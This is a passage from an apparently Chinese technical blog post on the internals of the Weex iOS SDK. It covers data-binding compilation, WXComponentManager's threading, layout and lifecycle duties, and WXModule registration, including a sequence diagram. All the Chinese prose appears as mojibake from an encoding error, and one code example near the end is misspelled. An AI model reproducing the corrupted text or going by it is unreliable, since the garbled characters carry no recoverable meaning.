<p>ä¸ºä»€ä¹ˆ Native ç»„ä»¶ä¸èƒ½è®© Proxy â€œè§£å†³â€ï¼Ÿ</p>
<p>æ ¸å¿ƒçŸ›ç›¾ï¼šæ¸²æŸ“è½½ä½“ä¸åŒã€‚Proxy ä¹‹æ‰€ä»¥åœ¨ Web ç«¯èƒ½ â€œé—´æ¥é©±åŠ¨ UIâ€ï¼Œæ˜¯å› ä¸º Web ç«¯æœ‰ä¸ªã€Œä¸­é—´æ¡¥æ¢ã€â€”â€” DOMï¼Œä¸” JS ç«¯æœ‰å®Œæ•´çš„ DOM APIï¼ˆæ¯”å¦‚ <code>document.getElementById</code>ã€<code>element.style.setProperty</code>ï¼‰ï¼š</p>
<p>Web ç«¯å®Œæ•´é“¾è·¯ï¼šProxy è§¦å‘æ›´æ–° â†’ Vue è¿è¡Œæ—¶è®¡ç®—è¡¨è¾¾å¼ â†’ è™šæ‹Ÿ DOM diff â†’ è°ƒç”¨ DOM API æ“ä½œ DOM â†’ UI æ›´æ–°</p>
<ul>
<li><strong>JS ç«¯æ²¡æœ‰æ“ä½œ Native æ§ä»¶çš„ API</strong>ï¼šæµè§ˆå™¨ç»™ JS æš´éœ²äº† DOM APIï¼Œä½† iOS/Android ç³»ç»Ÿä¸ä¼šç»™ JS å¼•æ“æš´éœ² â€œä¿®æ”¹ <code>UILabel</code> æ–‡æœ¬â€â€œè®¾ç½® <code>UIImageView</code> å›¾ç‰‡â€ çš„ API â€”â€” JS ç«¯è¿ Native æ§ä»¶çš„ â€œå¼•ç”¨â€ éƒ½æ‹¿ä¸åˆ°ï¼Œæ›´åˆ«è¯´æ›´æ–°äº†ï¼›</li>
<li><strong>Native æ§ä»¶ä¸åœ¨ JS è¿è¡Œæ—¶çš„å†…å­˜ç©ºé—´</strong>ï¼šJS å¼•æ“ï¼ˆå¦‚ V8ã€JSCï¼‰å’Œ Native åº”ç”¨æ˜¯ä¸¤ä¸ªç‹¬ç«‹çš„ â€œè¿›ç¨‹ / è™šæ‹Ÿæœºâ€ï¼Œå†…å­˜ä¸å…±äº« â€”â€” Proxy æ‰€åœ¨çš„ JS å†…å­˜é‡Œï¼Œæ ¹æœ¬æ²¡æœ‰ Native æ§ä»¶çš„å®ä¾‹ï¼Œæƒ³æ“ä½œéƒ½æ— ä»ä¸‹æ‰‹</li>
</ul>
<p>Weex çš„è®¾è®¡ä¼˜é›…ä¹‹å¤„åœ¨äºï¼šNative æ‰˜ç®¡â€œæ‰§è¡Œå±‚â€ï¼ŒProxy ä¿ç•™â€œè§¦å‘å±‚â€ã€‚å“åº”å¼å·¥ä½œç»§ç»­å¤ç”¨ç°æœ‰é€»è¾‘ï¼Œç”± Proxy å®Œæˆï¼Œæœ€åçš„æ‰§è¡Œå±‚ç”± Native å®ç°ï¼Œä¹Ÿå°±æ˜¯ WXComponent+DataBinding</p>
<ul>
<li><strong>å“åº”å¼ç³»ç»Ÿï¼ˆProxyï¼‰çš„æ ¸å¿ƒæ˜¯ â€œå‘ç°å˜åŒ–â€</strong>ï¼šä¸ç®¡æ˜¯ Web è¿˜æ˜¯ Weexï¼ŒProxy éƒ½åªå¹²è¿™ä»¶äº‹ï¼›</li>
<li><strong>UI æ›´æ–°çš„æ ¸å¿ƒæ˜¯ â€œæ“ä½œæ¸²æŸ“è½½ä½“â€</strong>ï¼šWeb ç«¯æ“ä½œ DOMï¼ˆJS ç«¯èƒ½åšï¼‰ï¼ŒWeex ç«¯æ“ä½œ Native æ§ä»¶ï¼ˆåªèƒ½ Native ç«¯åšï¼‰ï¼›</li>
<li><strong>WXComponent+DataBinding çš„è§’è‰²æ˜¯ â€œNative ç«¯çš„ UI æ‰§è¡Œå™¨â€</strong>ï¼šå®ƒä¸æ˜¯æ›¿ä»£ Proxyï¼Œè€Œæ˜¯ Proxy è§¦å‘æ›´æ–°åï¼Œè´Ÿè´£æŠŠ â€œæ›´æ–°é€šçŸ¥â€ è½åœ°åˆ° Native æ§ä»¶ä¸Šçš„å”¯ä¸€é€”å¾„</li>
</ul>
<h2 data-id="heading-22">å…­ã€Weex è‡ªå®šä¹‰ç»„ä»¶æ˜¯å¦‚ä½•å·¥ä½œçš„</h2>
<p>ä¸Šé¢åˆ†æäº†è‡ªå®šä¹‰ç»„ä»¶çš„æ•°æ®å˜åŒ–å’Œè¡¨è¾¾å¼è¿ç®—æ˜¯ Native è´Ÿè´£çš„ï¼Œæ‰§è¡Œå±‚ä¹Ÿå°±æ˜¯ <code>WXComponent+DataBinding.mm</code> è¿™ä¸ªç±»ã€‚</p>
<p>ä¸€è¨€ä»¥è”½ä¹‹å°±æ˜¯ï¼šæŠŠ JS ç«¯ä¼ é€’çš„â€œåŸå§‹æ•°æ®â€ï¼Œé€šè¿‡é¢„ç¼–è¯‘çš„ç»‘å®šè§„åˆ™ï¼ˆBlockï¼‰è®¡ç®—å‡º Native ç»„ä»¶éœ€è¦çš„æœ€ç»ˆå€¼ï¼Œå¹¶è‡ªåŠ¨æ›´æ–° UI ç»„ä»¶ï¼ŒåŒæ—¶é€‚é…é•¿åˆ—è¡¨ç»„ä»¶ç­‰å¤æ‚åœºæ™¯çš„ UI ä¼˜åŒ–ã€‚</p>
<p>è¯¥åˆ†ç±»ä¸ºæ‰€æœ‰ç»§æ‰¿è‡ª WXComponent çš„ç»„ä»¶ï¼Œæ³¨å…¥â€œæ•°æ®ç»‘å®šèƒ½åŠ›â€ï¼Œæ— éœ€æ‰‹åŠ¨å®ç°ã€‚</p>
<h3 data-id="heading-23">1. ç»‘å®šè§„åˆ™çš„â€œç¼–è¯‘å­˜å‚¨â€ï¼ŒæŠŠ JS è¡¨è¾¾å¼è½¬æ¢ä¸º Native å¯æ‰§è¡Œçš„ block</h3>
<p>æ•°æ®ç»‘å®šçš„ã€Œå‰ç½®å‡†å¤‡ã€ï¼šåœ¨ç»„ä»¶åˆå§‹åŒ–æ—¶ï¼Œè§£æ JS ç«¯ä¼ é€’çš„ç»‘å®šè§„åˆ™ï¼ˆå¦‚ <code>[[user.name]]</code>ã€<code>[[repeat]]</code>ï¼‰ï¼Œç¼–è¯‘ä¸º Native å¯æ‰§è¡Œçš„ <code>WXDataBindingBlock</code>ï¼ˆä»£ç å—ï¼‰ï¼Œå¹¶å­˜å‚¨åˆ°ç»„ä»¶çš„ç»‘å®šæ˜ å°„è¡¨ä¸­ï¼ˆ<code>_bindingProps/_bindingStyles/_bindingEvents</code> ç­‰ï¼‰</p>
<pre><code class="hljs language-objective-c" lang="objective-c">- (void)_storeBindingsWithProps:(NSDictionary *)props styles:(NSDictionary *)styles attributes:(NSDictionary *)attributes events:(NSDictionary *)events;
</code></pre>
<p>æ¥æ”¶ç»„ä»¶çš„ props/attrbutes/styles/events ä¸­çš„ç»‘å®šè§„åˆ™ï¼Œè§£æå¹¶å­˜å‚¨ä¸ºå¯æ‰§è¡Œçš„ blockã€‚</p>
<ol>
<li><strong>è¯†åˆ«ç»‘å®šè¡¨è¾¾å¼</strong>ï¼šåˆ¤æ–­æ˜¯å¦åŒ…å« <code>WXBindingIdentify</code>ï¼ˆ<code>@"@binding"</code>ï¼‰æ ‡è®°ï¼Œæ¯”å¦‚ <code>{"src": {"@binding": "user.name"}}</code>ï¼›</li>
<li><strong>AST è§£æ</strong>ï¼šé€šè¿‡ <code>WXJSASTParser</code> æŠŠç»‘å®šè¡¨è¾¾å¼å­—ç¬¦ä¸²ï¼ˆå¦‚ <code>"user.name + 'åç¼€'"</code>ï¼‰è§£æä¸º AST èŠ‚ç‚¹ï¼ˆ<code>WXJSExpression</code>ï¼‰ï¼›</li>
<li><strong>ç”Ÿæˆæ‰§è¡Œ Block</strong>ï¼šè°ƒç”¨ <code>-bindingBlockWithExpression:</code> æŠŠ AST èŠ‚ç‚¹è½¬æˆ <code>WXDataBindingBlock</code>ï¼ˆåç»­æ•°æ®å˜åŒ–æ—¶ç›´æ¥æ‰§è¡Œè¯¥ Block è®¡ç®—ç»“æœï¼‰ï¼›</li>
<li>åˆ†ç±»å­˜å‚¨ï¼šæŒ‰ç»‘å®šç±»å‹ï¼ˆå±æ€§ / æ ·å¼ / äº‹ä»¶ / ç‰¹æ®Šç»‘å®šï¼‰å­˜å…¥å¯¹åº”çš„æ˜ å°„è¡¨ï¼š
<ul>
<li><code>_bindingProps</code>ï¼šå±æ€§ç»‘å®šï¼ˆå¦‚ <code>src</code>ï¼‰ï¼›</li>
<li><code>_bindingStyles</code>ï¼šæ ·å¼ç»‘å®šï¼ˆå¦‚ <code>fontSize</code>ï¼‰ï¼›</li>
<li><code>_bindingEvents</code>ï¼šäº‹ä»¶ç»‘å®šï¼ˆå¦‚ <code>onClick</code> å‚æ•°ï¼‰ï¼›</li>
<li>ç‰¹æ®Šç»‘å®šï¼š<code>_bindingRepeat</code>ï¼ˆ<code>[[repeat]]</code> å¯¹åº” <code>v-for</code>ï¼‰ã€<code>_bindingMatch</code>ï¼ˆ<code>[[match]]</code> å¯¹åº” <code>v-if</code>ï¼‰ã€<code>_dataBindOnce</code>ï¼ˆ<code>[[once]]</code> å¯¹åº” <code>v-once</code>ï¼‰ã€‚</li>
</ul>
</li>
</ol>
<h3 data-id="heading-24">2. WXComponentManager éƒ½åšäº†ä»€ä¹ˆ</h3>
<p><code>WXComponentManager</code> æ˜¯ Weex iOS ç«¯çš„ <strong>ç»„ä»¶å…¨ç”Ÿå‘½å‘¨æœŸä¸ä»»åŠ¡è°ƒåº¦æ ¸å¿ƒ</strong>ï¼Œæ‰€æœ‰ä¸ Native ç»„ä»¶ç›¸å…³çš„æ“ä½œï¼ˆåˆ›å»ºã€æ›´æ–°ã€å¸ƒå±€ã€é”€æ¯ã€äº‹ä»¶ç»‘å®šï¼‰éƒ½ç”±å®ƒç»Ÿä¸€ç®¡ç†ï¼ŒåŒæ—¶æ‰¿æ‹…ã€Œçº¿ç¨‹åˆ†å·¥åè°ƒã€UI ä»»åŠ¡æ‰¹é‡å¤„ç†ã€æ€§èƒ½ç›‘æ§ã€ç­‰å…³é”®èŒè´£ï¼Œæ˜¯è¿æ¥ JS æŒ‡ä»¤ã€Native ç»„ä»¶ã€å¸ƒå±€å¼•æ“å’Œ UI æ¸²æŸ“çš„ â€œä¸­æ¢å¤§è„‘â€ã€‚</p>
<h4 data-id="heading-25">1. ç»„ä»¶çº¿ç¨‹ç®¡ç†</h4>
<p>ç»„ä»¶ä¸šåŠ¡çš„ â€œä¸“å±æ‰§è¡Œç¯å¢ƒâ€ï¼Œä½œä¸ºç»„ä»¶çº¿ç¨‹çš„ã€Œåˆ›å»ºè€…å’Œç»´æŠ¤è€…ã€ï¼Œ<code>WXComponentManager</code> ç¡®ä¿æ‰€æœ‰ç»„ä»¶æ ¸å¿ƒæ“ä½œéƒ½åœ¨<strong>å…¨å±€å”¯ä¸€çš„ç»„ä»¶çº¿ç¨‹</strong>ä¸­æ‰§è¡Œï¼Œé¿å…çº¿ç¨‹å®‰å…¨é—®é¢˜å’Œä¸»çº¿ç¨‹é˜»å¡ã€‚</p>
<p>æ ¸å¿ƒå·¥ä½œï¼š</p>
<ul>
<li>æ‡’åŠ è½½åˆ›å»ºå…¨å±€ç»„ä»¶çº¿ç¨‹ï¼ˆ<code>+componentThread</code>ï¼‰ï¼Œå¯åŠ¨ RunLoop ç¡®ä¿çº¿ç¨‹å¸¸é©»ï¼ˆ<code>_runLoopThread</code>ï¼‰</li>
<li>æä¾›çº¿ç¨‹è°ƒåº¦æ¥å£ï¼š<code>WXPerformBlockOnComponentThread</code>ï¼ˆå¼‚æ­¥ï¼‰ã€<code>WXPerformBlockSyncOnComponentThread</code>ï¼ˆåŒæ­¥ï¼‰ï¼Œè®©å¤–éƒ¨æ¨¡å—ï¼ˆå¦‚ <code>WXBridgeManager</code>ï¼‰èƒ½å°†ç»„ä»¶ä»»åŠ¡æäº¤åˆ°ç»„ä»¶çº¿ç¨‹</li>
<li>çº¿ç¨‹æ–­è¨€çº¦æŸï¼šæ‰€æœ‰ç»„ä»¶æ ¸å¿ƒæ–¹æ³•ï¼ˆå¦‚ <code>createBody</code>ã€<code>updateStyles</code>ï¼‰å¼€å¤´éƒ½æœ‰ <code>WXAssertComponentThread</code>ï¼Œå¼ºåˆ¶ç»„ä»¶æ“ä½œåœ¨ç»„ä»¶çº¿ç¨‹æ‰§</li>
</ul>
<h4 data-id="heading-26">2. ç»„ä»¶æ ‘æ„å»ºä¸ç®¡ç†ï¼šç»„ä»¶çš„ â€œå¢åˆ æ”¹æŸ¥â€ å…¨ç”Ÿå‘½å‘¨æœŸ</h4>
<p>æ ¸å¿ƒå·¥ä½œï¼š</p>
<ul>
<li>åˆ›å»ºç»„ä»¶
<ul>
<li>æ ¹ç»„ä»¶åˆ›å»ºï¼ˆ<code>createBody:</code>ï¼‰ï¼šæ¥æ”¶ JS ç«¯æ ¹ç»„ä»¶æŒ‡ä»¤ï¼Œåˆ›å»ºé¡µé¢æ ¹ç»„ä»¶ï¼ˆå¦‚ <code>&lt;div&gt;</code> æ ¹èŠ‚ç‚¹ï¼‰ï¼Œç»‘å®šåˆ°é¡µé¢æ ¹è§†å›¾ï¼›</li>
<li>å­ç»„ä»¶åˆ›å»ºï¼ˆ<code>addComponent:type:parentRef:</code>ï¼‰ï¼šæ ¹æ® JS ç«¯æŒ‡ä»¤ï¼Œåˆ›å»ºå­ç»„ä»¶å¹¶å…³è”çˆ¶ç»„ä»¶ï¼Œå­˜å…¥ <code>_indexDict</code>ï¼ˆç»„ä»¶ ref â†’ å®ä¾‹æ˜ å°„ï¼Œå¿«é€ŸæŸ¥æ‰¾ï¼‰ã€‚</li>
</ul>
</li>
<li>æ›´æ–°ç»„ä»¶å…³ç³»
<ul>
<li>ç§»åŠ¨ç»„ä»¶ï¼ˆ<code>moveComponent:toSuper:atIndex:</code>ï¼‰ï¼šè°ƒæ•´ç»„ä»¶åœ¨ç»„ä»¶æ ‘ä¸­çš„ä½ç½®ï¼ŒåŒæ­¥æ›´æ–°è§†å›¾å±‚çº§ï¼›</li>
<li>åˆ é™¤ç»„ä»¶ï¼ˆ<code>removeComponent:</code>ï¼‰ï¼šä»ç»„ä»¶æ ‘å’Œç´¢å¼•å­—å…¸ä¸­ç§»é™¤ç»„ä»¶ï¼Œé€’å½’åˆ é™¤å­ç»„ä»¶ï¼Œé‡Šæ”¾è§†å›¾èµ„æºã€‚</li>
</ul>
</li>
<li>ç»„ä»¶æŸ¥è¯¢ä¸éå†
<ul>
<li>æŒ‰ ref æŸ¥æ‰¾ç»„ä»¶ï¼ˆ<code>componentForRef:</code>ï¼‰ï¼šä¾› JS ç«¯ <code>this.$refs</code> è®¿é—®åŸç”Ÿç»„ä»¶å®ä¾‹ï¼›</li>
<li>éå†ç»„ä»¶æ ‘ï¼ˆ<code>enumerateComponentsUsingBlock:</code>ï¼‰ï¼šæ”¯æŒé€’å½’éå†æ‰€æœ‰ç»„ä»¶ï¼ˆå¦‚æ€§èƒ½ç»Ÿè®¡ã€å…¨å±€æ ·å¼æ›´æ–°ï¼‰</li>
</ul>
</li>
</ul>
<h4 data-id="heading-27">3.  æ•°æ®ç»‘å®šè¾…åŠ©ï¼šç»‘å®šè§„åˆ™çš„æå–ä¸å­˜å‚¨</h4>
<p>é…åˆ <code>WXComponent+DataBinding</code> æ¨¡å—ï¼Œ<code>WXComponentManager</code> åœ¨ç»„ä»¶åˆ›å»ºæ—¶ï¼Œä» JS ç«¯ä¼ é€’çš„ <code>props</code>/<code>styles</code>/<code>attributes</code> ä¸­æå–ã€Œç»‘å®šè¡¨è¾¾å¼é…ç½®ã€ï¼Œä¸ºå“åº”å¼æ›´æ–°é“ºè·¯ã€‚æ ¸å¿ƒå·¥ä½œï¼š</p>
<ul>
<li>æå–ç»‘å®šè§„åˆ™ï¼š
<ul>
<li><code>_extractBindings:</code>ï¼šä»æ ·å¼ / å±æ€§ä¸­æå– <code>[[repeat]]</code>/<code>{"@binding": "expr"}</code> ç­‰ç»‘å®šé…ç½®ï¼Œç§»é™¤åŸå§‹å­—å…¸ä¸­çš„ç»‘å®šå­—æ®µï¼ˆé¿å…å¹²æ‰°æ™®é€šå±æ€§å¤„ç†ï¼‰</li>
<li><code>_extractBindingEvents:</code>ï¼šä»äº‹ä»¶æ•°ç»„ä¸­æå–ç»‘å®šå‚æ•°ï¼ˆå¦‚ <code>onClick</code> çš„å›è°ƒè¡¨è¾¾å¼ï¼‰ï¼›</li>
<li><code>_extractBindingProps:</code>ï¼šæå–ç»„ä»¶è‡ªå®šä¹‰ props ç»‘å®šï¼ˆ<code>@componentProps</code>ï¼‰ã€‚</li>
</ul>
</li>
<li>å­˜å‚¨ç»‘å®šè§„åˆ™ï¼šè°ƒç”¨ç»„ä»¶çš„ <code>_storeBindingsWithProps:styles:attributes:events:</code>ï¼Œå°†æå–çš„ç»‘å®šé…ç½®å­˜å…¥ç»„ä»¶å®ä¾‹ï¼Œåç»­æ•°æ®å˜åŒ–æ—¶è§¦å‘è¡¨è¾¾å¼è®¡ç®—ã€‚</li>
</ul>
<h4 data-id="heading-28">4. ç»„ä»¶æ›´æ–°è°ƒåº¦ï¼šæ ·å¼ / å±æ€§ / äº‹ä»¶çš„ â€œåŒæ­¥ä¸æ‰§è¡Œâ€</h4>
<p>å½“ JS ç«¯è§¦å‘ç»„ä»¶æ›´æ–°ï¼ˆå¦‚ä¿®æ”¹æ ·å¼ã€å±æ€§ã€ç»‘å®šäº‹ä»¶ï¼‰æ—¶ï¼Œ<code>WXComponentManager</code> è´Ÿè´£ã€Œè·¨çº¿ç¨‹è°ƒåº¦ã€æ•°æ®é¢„å¤„ç†ã€UI åŒæ­¥ã€ï¼Œç¡®ä¿æ›´æ–°æµç¨‹é«˜æ•ˆä¸”å®‰å…¨ã€‚</p>
<ul>
<li>æ ·å¼æ›´æ–°ï¼ˆ<code>updateStyles:forComponent:</code>ï¼‰
<ul>
<li>ç»„ä»¶çº¿ç¨‹ï¼šè¿‡æ»¤æ— æ•ˆæ ·å¼ï¼ˆå¦‚ç©ºå€¼ï¼‰ï¼Œæ›´æ–°ç»„ä»¶å®ä¾‹çš„æ ·å¼æ•°æ®ï¼Œè§¦å‘å¸ƒå±€è®¡ç®—ï¼›</li>
<li>ä¸»çº¿ç¨‹ï¼šé€šè¿‡ <code>_addUITask</code> å°†æ ·å¼æ›´æ–°ä»»åŠ¡ï¼ˆå¦‚è®¾ç½® <code>CALayer.backgroundColor</code>ã€<code>UILabel.font</code>ï¼‰æ‰¹é‡è°ƒåº¦åˆ°ä¸»çº¿ç¨‹æ‰§è¡Œã€‚</li>
</ul>
</li>
<li><strong>å±æ€§æ›´æ–°ï¼ˆ<code>updateAttributes:forComponent:</code>ï¼‰</strong>ï¼šç±»ä¼¼æ ·å¼æ›´æ–°ï¼Œç»„ä»¶çº¿ç¨‹å¤„ç†æ•°æ®é€»è¾‘ï¼Œä¸»çº¿ç¨‹æ›´æ–°åŸç”Ÿç»„ä»¶å±æ€§ï¼ˆå¦‚ <code>UIImageView.image</code>ã€<code>UIScrollView.contentOffset</code>ï¼‰ã€‚</li>
<li>äº‹ä»¶ç»‘å®š / è§£ç»‘
<ul>
<li>ç»„ä»¶çº¿ç¨‹ï¼šç»´æŠ¤ç»„ä»¶çš„äº‹ä»¶åˆ—è¡¨ï¼ˆå¦‚ <code>click</code>/<code>scroll</code>ï¼‰ï¼›</li>
<li>ä¸»çº¿ç¨‹ï¼šç»‘å®š / ç§»é™¤åŸç”Ÿæ‰‹åŠ¿è¯†åˆ«å™¨ï¼ˆå¦‚ <code>UITapGestureRecognizer</code>ï¼‰ï¼Œæ•è·ç”¨æˆ·äº¤äº’ã€‚</li>
</ul>
</li>
<li><strong>æ‰¹é‡æ›´æ–°ä¼˜åŒ–</strong>ï¼šé€šè¿‡ <code>performBatchBegin</code>/<code>performBatchEnd</code> æ ‡è®°æ‰¹é‡æ›´æ–°èŒƒå›´ï¼Œåˆå¹¶å¤šä¸ª UI ä»»åŠ¡ï¼Œå‡å°‘ä¸»çº¿ç¨‹è°ƒåº¦æ¬¡æ•°ï¼ˆæå‡æ€§èƒ½ï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-29">5. å¸ƒå±€è°ƒåº¦ä¸ UI åŒæ­¥ï¼šä»å¸ƒå±€è®¡ç®—åˆ° UI æ¸²æŸ“</h4>
<p>Weex é‡‡ç”¨ Flex å¸ƒå±€å¼•æ“ï¼ˆYogaï¼‰ï¼Œ<code>WXComponentManager</code> è´Ÿè´£å¸ƒå±€è®¡ç®—çš„è§¦å‘ã€ç»„ä»¶ frame åˆ†é…ã€UI ä»»åŠ¡æ‰¹é‡æ‰§è¡Œï¼Œç¡®ä¿ç»„ä»¶æŒ‰é¢„æœŸä½ç½®æ¸²æŸ“ã€‚</p>
<ul>
<li>è§¦å‘å¸ƒå±€è®¡ç®—ï¼šç»„ä»¶æ›´æ–°ã€æ ¹è§†å›¾å°ºå¯¸å˜åŒ–ï¼ˆ<code>rootViewFrameDidChange:</code>ï¼‰æ—¶ï¼Œè°ƒç”¨ <code>_layoutAndSyncUI</code> è§¦å‘ <code>WXCoreBridge</code> æ‰§è¡Œ Yoga å¸ƒå±€è®¡ç®—ï¼Œå¾—åˆ°æ‰€æœ‰ç»„ä»¶çš„ frameã€‚</li>
<li>åˆ†é…ç»„ä»¶ frameï¼š<code>layoutComponent:frame:isRTL:innerMainSize:</code> å°†è®¡ç®—åçš„ frame åˆ†é…ç»™ç»„ä»¶ï¼Œè‹¥ä¸ºæ ¹ç»„ä»¶ï¼ŒåŒæ­¥æ›´æ–°é¡µé¢æ ¹è§†å›¾å°ºå¯¸ï¼ˆé€‚é… <code>wrap_content</code> æ¨¡å¼ï¼‰ã€‚</li>
<li>UI ä»»åŠ¡åŒæ­¥ï¼š<code>_syncUITasks</code> æ‰¹é‡æ‰§è¡Œ <code>_uiTaskQueue</code> ä¸­çš„ UI ä»»åŠ¡ï¼ˆå¦‚ <code>addSubview</code>ã€<code>setFrame</code>ï¼‰ï¼Œå¼‚æ­¥è°ƒåº¦åˆ°ä¸»çº¿ç¨‹ï¼Œé¿å…é¢‘ç¹ä¸»çº¿ç¨‹åˆ‡æ¢å¯¼è‡´æ‰å¸§ã€‚</li>
<li>å¸§ç‡åŒæ­¥ï¼šé€šè¿‡ <code>WXDisplayLinkManager</code> ç›‘å¬å±å¹•åˆ·æ–°ç‡ï¼ˆ60fpsï¼‰ï¼Œç¡®ä¿å¸ƒå±€æ›´æ–°ä¸å¸§ç‡åŒæ­¥ï¼Œæå‡æ¸²æŸ“æµç•…åº¦ã€‚</li>
</ul>
<h4 data-id="heading-30">6. ç”Ÿå‘½å‘¨æœŸä¸èµ„æºé‡Šæ”¾ï¼šé¡µé¢å¸è½½æ—¶çš„ â€œæ¸…ç†å·¥ä½œâ€</h4>
<p>å½“ Weex é¡µé¢é”€æ¯ï¼ˆ<code>WXSDKInstance</code> å¸è½½ï¼‰æ—¶ï¼Œ<code>WXComponentManager</code> è´Ÿè´£æ¸…ç†ç»„ä»¶èµ„æºï¼Œé¿å…å†…å­˜æ³„æ¼ã€‚</p>
<p>æ ¸å¿ƒå·¥ä½œï¼ˆ<code>unload</code> æ–¹æ³•ï¼‰ï¼š</p>
<ul>
<li>åœæ­¢å¸ƒå±€è°ƒåº¦ï¼šè°ƒç”¨ <code>_stopDisplayLink</code>ï¼Œåœæ­¢å¸§ç‡ç›‘å¬å’Œå¸ƒå±€è®¡ç®—ï¼›</li>
<li>è§£ç»‘æ¸²æŸ“èµ„æºï¼šéå†æ‰€æœ‰ç»„ä»¶ï¼Œè§£é™¤ä¸åº•å±‚æ¸²æŸ“å¯¹è±¡ï¼ˆ<code>RenderObject</code>ï¼‰çš„ç»‘å®šï¼›</li>
<li>é‡Šæ”¾ UI èµ„æºï¼šè°ƒåº¦åˆ°ä¸»çº¿ç¨‹ï¼Œé”€æ¯æ‰€æœ‰ç»„ä»¶çš„åŸç”Ÿè§†å›¾ï¼ˆ<code>_unloadViewWithReusing:</code>ï¼‰ï¼›</li>
<li>æ¸…ç©ºçŠ¶æ€ï¼šæ¸…ç©º <code>_indexDict</code>ã€<code>_uiTaskQueue</code>ã€<code>_fixedComponents</code> ç­‰å®¹å™¨ï¼Œè§£é™¤ä¸ <code>WXSDKInstance</code>çš„ç»‘å®šã€‚</li>
<li>æ¸…é™¤äº‹ä»¶ç»‘å®šï¼šæ¸…é™¤æ‰€æœ‰çš„äº‹ä»¶ã€æ‰‹åŠ¿ç­‰é€»è¾‘</li>
</ul>
<h2 data-id="heading-31">ä¸ƒã€WXModule çš„æ³¨å†Œæœºåˆ¶åŠå…¶è°ƒç”¨æµç¨‹</h2>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant JS as JSç¯å¢ƒ
    participant B as WXBridge
    participant MF as WXModuleFactory
    participant MM as WXModuleManager
    participant MI as Moduleå®ä¾‹
    participant MC as è‡ªå®šä¹‰Module

    Note over JS,MC: æ³¨å†Œé˜¶æ®µ
    MC-&gt;&gt;+MF: registerModule("customModule", MyModule.class)
    MF-&gt;&gt;MF: ç”ŸæˆModuleFactoryå¹¶ç¼“å­˜
    MF-&gt;&gt;MF: åå°„è§£æ@JSMethodæ–¹æ³•
    MF-&gt;&gt;B: å°†æ¨¡å—&amp;æ–¹æ³•ä¿¡æ¯ä¼ é€’ç»™JS

    Note over JS,MC: è°ƒç”¨é˜¶æ®µ
    JS-&gt;&gt;+B: weex.requireModule('customModule').myMethod(args)
    B-&gt;&gt;+MM: è°ƒç”¨ invokeModuleMethod
    MM-&gt;&gt;+MF: è·å–Moduleå®ä¾‹å’Œæ–¹æ³•Invoker
    MF-&gt;&gt;MF: æŸ¥æ‰¾/åˆ›å»ºModuleå®ä¾‹
    MF-&gt;&gt;MF: è·å–æ–¹æ³•Invoker
    MF-&gt;&gt;MM: è¿”å›å®ä¾‹å’ŒInvoker
    MM-&gt;&gt;+MI: é€šè¿‡Invoker.invokeè°ƒç”¨
    MI-&gt;&gt;+MC: æ‰§è¡ŒåŸç”Ÿæ–¹æ³•å®ç°
    MC-&gt;&gt;JS: é€šè¿‡callbackå›è°ƒJSï¼ˆå¯é€‰ï¼‰
</code></pre>
<h3 data-id="heading-32">1. WXModule çš„æ³¨å†Œåˆ†ä¸º Naitve æ³¨å†Œå’Œ JS æ³¨å†Œ</h3>
<ul>
<li><strong>Native æ³¨å†Œ</strong>ï¼šåœ¨ Native ç«¯ï¼Œè°ƒç”¨ <code>[WXSDKEngine registerModule:withClass:]</code> æ–¹æ³•ï¼ˆåœ¨ iOS ä¸­ï¼‰ ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¼šå°†è‡ªå®šä¹‰ Module çš„ç±»å’Œä¸€ä¸ªæ¨¡å—åç§°ï¼ˆä¾‹å¦‚ <code>TestModule</code>ï¼‰å»ºç«‹æ˜ å°„å…³ç³»ï¼Œå¹¶ç”Ÿæˆä¸€ä¸ª <code>ModuleFactory</code> å­˜å‚¨åœ¨ä¸€ä¸ªå…¨å±€çš„ Mapï¼ˆä¾‹å¦‚ <code>sModuleFactoryMap</code>ï¼‰ä¸­ã€‚åŒæ—¶ï¼Œå¦‚æœè¯¥ Module è¢«æ ‡è®°ä¸ºå…¨å±€ï¼ˆglobalï¼‰ï¼ŒSDK ä¼šç«‹å³åˆ›å»ºä¸€ä¸ªå®ä¾‹å¹¶ç¼“å­˜èµ·æ¥ã€‚</li>
<li><strong>JS æ³¨å†Œ</strong>ï¼šNative æ³¨å†Œå®Œæˆåï¼ŒWeex ä¼šå°†æ‰€æœ‰å·²æ³¨å†Œ Module çš„<strong>æ¨¡å—åç§°</strong>åŠå…¶<strong>æš´éœ²ç»™ JS çš„æ–¹æ³•ååˆ—è¡¨</strong>ï¼Œé€šè¿‡ <code>WXBridge</code>ï¼ˆJS-Native é€šä¿¡æ¡¥æ¢ï¼‰ä¼ é€’ç»™ JS å¼•æ“ã€‚è¿™æ ·ï¼ŒJS ç«¯å°±çŸ¥é“å­˜åœ¨å“ªäº›æ¨¡å—ä»¥åŠæ¯ä¸ªæ¨¡å—æœ‰å“ªäº›æ–¹æ³•å¯ä»¥è°ƒç”¨ã€‚</li>
</ul>
<h3 data-id="heading-33">2. å½“ JS è°ƒç”¨ Module æ–¹æ³•æ—¶</h3>
<ul>
<li>JS å‘èµ·è°ƒç”¨ï¼šåœ¨ JS ä»£ç ä¸­ï¼Œé€šè¿‡ <code>weex.requireModule('moduleName')</code> è·å–æ¨¡å—å®ä¾‹ ã€‚ç„¶ååŠå½±å…¶æ–¹æ³•ï¼Œæ¯”å¦‚ 'staream.fetch()options, callack)'</li>
<li>Bridge æ¡¥æ¥ï¼šJS å¼•æ“é€šè¿‡ JSBridge å°†è¿™æ¬¡è°ƒç”¨ï¼ˆåŒ…æ‹¬æ¨¡å—åã€æ–¹æ³•åã€å‚æ•°ç­‰ä¿¡æ¯ï¼‰ä¼ é€’ç»™ Native æ®µ</li>
<li>Native ç«¯æŸ¥æ‰¾ä¸æ‰§è¡Œï¼šNative ç«¯çš„ WXModuleManager æ ¹æ®æ¨¡å—åä»ä¹‹å‰æ³¨å†Œçš„å·¥å‚ä¸­è·å–åˆ›å»ºçš„ Module å®ä¾‹ï¼Œå¹¶æ ¹æ®æ–¹æ³•åæ‰¾åˆ°å¯¹åº”çš„ MethodInvokerã€‚MethodInvoker ä¼šé€šè¿‡åå°„æ‰‹æ®µè°ƒç”¨å…·ä½“çš„ Native æ–¹æ³•</li>
